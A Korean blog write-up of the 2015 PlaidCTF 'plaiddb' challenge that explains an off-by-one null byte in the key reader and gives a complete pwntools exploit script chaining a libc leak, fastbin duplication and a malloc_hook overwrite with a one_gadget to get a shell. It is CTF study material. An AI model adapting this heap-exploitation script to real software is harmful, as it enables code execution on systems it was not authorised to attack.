---
layout: post
title: "[2015 plaid-ctf] plaiddb 풀이"
date: 2018-09-27 04:44
categories: "[Pwn]CTF"
tags: rotles98
---

>### Explit [this database server](https://github.com/ctfs/write-ups-2015/raw/master/plaidctf-2015/pwnable/plaiddb/datastore_7e64104f876f0aa3f8330a409d9b9924.elf)
### [Libc](https://github.com/ctfs/write-ups-2015/raw/master/plaidctf-2015/pwnable/plaiddb/libc_3f6aaa980b58f7c7590dee12d731e099.so.6)
### Running at 52.4.86.204 64613

`poison_null_byte` 문제

- - -
# 0x00. 분석

{: refdef: style="text-align: center;"}
![checksec](/img/2015_plaid-ctf/plaiddb/01.png)
{: refdef}

으으

```c
struct chunk
{
    char *row_key;
    unsigned int data_len;
    char *data;

    struct chunk *left;
    struct chunk *right;
    struct chunk *parent;
};
```

문제 푼 지 좀 돼서 저게 아닐 수도 있는데 뭐 중요하진 않아요

`func_key_read`

1. `malloc(0x8)`

2. `malloc_usable_size`를 사용해 입력할 길이의 최댓값을 저장

3. `getc` 함수로 한 문자씩 읽다가 `-1`이 나오면 `exit(0)`

4. 읽다가 길이의 최댓값을 넘어가면 `realloc`을 사용해 길이를 늘리고 다시 반복

5. `10(\n)`이 나오면 문자열 마지막에 `\x00`을 붙힘 **!!off_by_one!!**<br /><br />

`func_GET`

1. `func_key_read` 함수 호출

2. `chunk_head`부터 `row_key`를 검색

3. 같은 `row_key`를 발견하면 해당 `data`를 `data_len`만큼 출력

4. 검색을 위해 할당받은 `buf`를 `free`함<br /><br />

`func_PUT`

1. 새로운 `chunk (N)` 할당

2. `N -> row_key = func_key_read`

3. `data_len` 입력받고 저장하고 해당 길이만큼 `N -> data`에 할당받고 `fread`함

4. `add_chunk`함수를 사용해서 이전에 존재하던 `chunk`랑 연결함

5. 만약 `row_key`가 중복이면 `N -> row_key`, `기존 chunk -> data`, `N` 순서로 `free`<br /><br />

`func_DUMP`

1. 모든 `chunk`의 `row_key`, `data_len`을 출력<br /><br />

`func_DEL`

1. `func_key_read`

2. `chunk_head`부터 `row_key`로 검색

3. 존재하면 `chunk -> row_key`, `chunk_data`, `chunk`, 검색을 위해 할당받은 `buf` 순으로 `free`<br /><br />

이거 풀 때 다른 글도 많이 봤지만 [이 글](http://bachs.tistory.com/entry/how2heap-Poison-NULL-Byte)을 제일 많이 참고했어요.

해당 글에서 나온 것처럼 `heap`을 만들려고 노트에 순서같은걸 적어놨는데 버려서 없네요.

대신 각 함수마다 `malloc`, `free`하는건 따로 남겨뒀어요.

{: refdef: style="text-align: center;"}
![heap](/img/2015_plaid-ctf/plaiddb/02.png)
{: refdef}

`func_DEL`의 `malloc(key_input)`은 좁아서 안 적음

맨 밑에는 `row_key`의 `size`가 커지는 순서

- - -
# 0x01. 공격 방법

`poison_null_byte`를 사용하면 `chunk`, `chunk -> key`, `chunk -> data` 등의 값을 바꿀 수 있어요.

저는 `chunk` 부분에 `unsorted_bin`을 만들어서 `func_DUMP`의 `data_len`을 출력하는 부분으로 `libc_leak`을 했어요.

지금 생각해보면 저렇게 한 이유가 아마 덮을 수 있는 부분이 `chunk`밖에 없어서 그런거 같은데 저랑 순서를 다르게하면 다른 방법으로도 `libc_leak`을 할 수 있을 거 같아요.

그리고 위 참고한 글에서의 `b2`부분을 사용해서 `fastbin_dup_into_stack`으로 `malloc_hook`를 덮어서 풀었어요.

1. `poison_null_byte`

2. `libc_leak`

3. `fastbin_dup_into_stack`

4. `malloc_hook` -> `one_gadget`

- - -
# 0x02. 익스플로잇

```python
from pwn import *
#context.log_level = "debug"

HOST = "192.168.0.19"
#HOST = "52.4.86.204"
PORT = 4444
#PORT = 64613

s = remote(HOST, PORT)
pause()

elf = ELF("./plaiddb")
libc = ELF("./libc.so.6")

libc_off = 0x3c4b78
malloc_hook_off = 0x3c4b10
one_off = 0x4526a

def func_GET(key):
    s.recvuntil("PROMPT: Enter command:\n")
    s.sendline("GET")

    s.recvuntil("PROMPT: Enter row key:\n")
    s.sendline(key)

def func_PUT(key, content):
    s.recvuntil("PROMPT: Enter command:\n")
    s.sendline("PUT")

    s.recvuntil("PROMPT: Enter row key:\n")
    s.sendline(key)

    s.recvuntil("PROMPT: Enter data size:\n")
    s.sendline(str(len(content)))

    s.recvuntil("PROMPT: Enter data:\n")
    s.send(content)

def func_PUT_size(key, size, content):
    s.recvuntil("PROMPT: Enter command:\n")
    s.sendline("PUT")

    s.recvuntil("PROMPT: Enter row key:\n")
    s.sendline(key)

    s.recvuntil("PROMPT: Enter data size:\n")
    s.sendline(str(size))

    s.recvuntil("PROMPT: Enter data:\n")
    s.send(content)

def func_DUMP():
    s.recvuntil("PROMPT: Enter command:\n")
    s.sendline("DUMP")

def func_DEL(key):
    s.recvuntil("PROMPT: Enter command:\n")
    s.sendline("DEL")

    s.recvuntil("PROMPT: Enter row key:\n")
    s.sendline(key)

func_PUT("1", "A"*0x38)
func_DEL("th3fl4g")
func_DEL("1")

func_PUT("1", "A"*0x18)
func_DEL("1")

payload = "A"*0x1f0
payload += p64(0x200)
func_PUT("B", payload.ljust(0x208, "A"))
func_PUT("C", "A"*0x88)

func_DEL("B")
func_DEL("\x00"*0x18) # off by one

func_PUT("b1", "A"*0x88)
func_PUT("b2", "A"*0x68)
func_PUT("libc_leak", "A"*0xf8)

func_DEL("b1")
func_DEL("C")

payload = "A"*0x88
payload += p64(0x71) # b2 -> buf -> size
payload += "A"*0x68
func_PUT("A", payload)

func_DUMP()

while 1:
    dump = s.recvuntil("bytes\n").split("[")[1].split("]")

    if(dump[0] == "A" or dump[0] == "b2"):
        continue

    libc_leak = int(dump[1].split(" ")[1])
    break

libc_base = libc_leak - libc_off
libc_malloc_hook = libc_base + malloc_hook_off
libc_one = libc_base + one_off

print
log.info("libc_base : " + hex(libc_base))
log.info("libc_malloc_hook : " + hex(libc_malloc_hook))
log.info("libc_one : " + hex(libc_one))
print

func_DEL("A")
func_DEL("b2")

payload = "A"*0x88
payload += p64(0x71) # b2 -> size
payload += p64(libc_malloc_hook - 0x13) # b2 -> fd
func_PUT("A", payload.ljust(0xe8, "A"))

func_PUT("b2", "A"*0x68)

payload = "\x7f\x00\x00"
payload += p64(libc_one) # malloc_hook
func_PUT("malloc_hook", payload.ljust(0x68, "\x00"))

func_DEL("A") # exploit

s.interactive()
```

### flag{one_null_byte_t0_rul3_them_all_4ecd68f0}
